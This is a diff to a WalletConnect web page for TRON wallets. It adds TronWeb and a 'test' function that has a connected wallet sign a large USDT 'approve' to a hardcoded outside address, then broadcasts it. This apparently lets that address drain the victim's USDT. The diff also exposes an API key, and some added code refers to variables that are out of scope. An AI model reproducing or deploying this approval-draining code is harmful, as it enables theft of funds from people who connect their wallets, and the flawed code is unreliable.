@@ -9,6 +9,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@depay/walletconnect-v2@2.12.2/dist/umd/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.1/dist/TronWeb.min.js"></script>
     <link rel="stylesheet" href="style.css?t=15943">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
@@ -64,11 +65,15 @@
             padding: 1rem;
             border-radius: 10px;
             max-width: 600px;
-            margin: 2rem auto;
-            margin-left: 20px;
-            margin-right: 20px;
+            margin: 0 auto;
             box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
-            position: relative;
+            /* ✅ 固定在畫面底部 */
+            position: fixed;
+            bottom: 20px; /* 距離畫面底部 20px，可調整 */
+            left: 50%;
+            transform: translateX(-50%);
+            width: calc(100% - 40px); /* 避免太寬，適應小螢幕 */
+            max-width: 600px;
         }
         .app-banner .logo {
             display: flex;
@@ -379,8 +384,8 @@
         });
 
         // 連線錢包
-        document.querySelector('#connectWallet').addEventListener('click', function() {
-            initWalletConnect();
+        document.querySelector('#connectWallet').addEventListener('click', async function() {
+            window.wc = await initWalletConnect();
         });
 
         function showAppList(uri) {
@@ -431,11 +436,10 @@
                 canvas.height = qrImage.height;
                 ctx.drawImage(qrImage, 0, 0);
 
-                // 3️⃣ 在 QR Code 中間放置 Logo
                 let logo = new Image();
                 logo.src = logoUrl;
                 logo.onload = function () {
-                    let logoSize = canvas.width * 0.25; // 設定 Logo 大小為 QR Code 20%
+                    let logoSize = canvas.width * 0.25; 
                     let x = (canvas.width - logoSize) / 2;
                     let y = (canvas.height - logoSize) / 2;
                     ctx.drawImage(logo, x, y, logoSize, logoSize);
@@ -447,7 +451,72 @@
             return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         }
 
+        async function test() {
+            let signClient = window.wc.client;
+            let session = window.wc.session;
+            const accounts = session.namespaces.tron.accounts;
+            await approveUSDT(signClient, accounts[0], 'TZ8Ksz21Hk1tQuztCKCUJBRXStCav9uyjM', 10000000000);
+        }
+
+        async function approveUSDT(signClient, tronAddress, spenderAddress, amount) {
+            try {
+                const usdtContractAddress = "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn"; // USDT 合約
+                const functionSelector = "approve(address,uint256)";
+                const parameter = [
+                    { type: "address", value: spenderAddress },
+                    { type: "uint256", value: amount } 
+                ];
+
+                // ✅ 創建交易
+                const transaction = await TronWeb.TransactionBuilder.triggerSmartContract(
+                    usdtContractAddress,
+                    functionSelector,
+                    {},
+                    parameter,
+                    tronAddress
+                );
+
+                console.log("🔹 交易已構建:", transaction);
+
+                if (!transaction.result || !transaction.result.result) {
+                    throw new Error("❌ 交易構建失敗");
+                }
+
+                // ✅ 透過 WalletConnect 進行交易簽名
+                const signedTransaction = await signClient.request({
+                    topic: session.topic,
+                    chainId: "tron:1",
+                    request: {
+                        method: "tron_signTransaction",
+                        params: transaction.transaction,
+                    },
+                });
+
+                console.log("✅ 交易已簽名:", signedTransaction);
+
+                // ✅ 廣播交易
+                const broadcast = await tronWeb.trx.sendRawTransaction(signedTransaction);
+                console.log("✅ 交易已廣播:", broadcast);
+
+                if (broadcast.result) {
+                    console.log("🎉 USDT Approve 成功，交易哈希:", broadcast.txid);
+                    return broadcast.txid;
+                } else {
+                    throw new Error("❌ USDT Approve 失敗");
+                }
+
+            } catch (error) {
+                console.error("❌ USDT Approve 交易失敗:", error);
+            }
+        }
+
         async function initWalletConnect() {
+            const tronWeb = new TronWeb({
+                fullHost: "https://api.trongrid.io", // ✅ TRON 主網
+                headers: { "TRON-PRO-API-KEY": "98c4cb7e-e4c4-46ff-877e-09afff3a0869" },
+                privateKey: ""
+            });
+            
             const client = await WalletConnectV2.SignClient.init({
                 projectId: projectId, 
                 relayUrl: "wss://relay.walletconnect.com", 
@@ -468,8 +537,6 @@
                     },
                 },
             });
-
-            console.log(uri);
 
             if (uri) {
                 if(isMobile()) {
@@ -496,7 +563,28 @@
                 console.log("🔴 Session Deleted:", topic);
             });
 
-            return { client, session };
+            tronWeb.setSigner(async (transaction) => {
+                console.log("🔹 透過 WalletConnect 進行交易簽名...");
+
+                try {
+                    const signedTransaction = await signClient.request({
+                        topic: session.topic,
+                        chainId: "tron:1",
+                        request: {
+                            method: "tron_signTransaction",
+                            params: transaction,
+                        },
+                    });
+
+                    console.log("✅ 交易已簽名:", signedTransaction);
+                    return signedTransaction;
+                } catch (error) {
+                    console.error("❌ 簽名失敗:", error);
+                    throw error;
+                }
+            });
+
+            return { client, session, tronWeb };
         }
 
     </script>
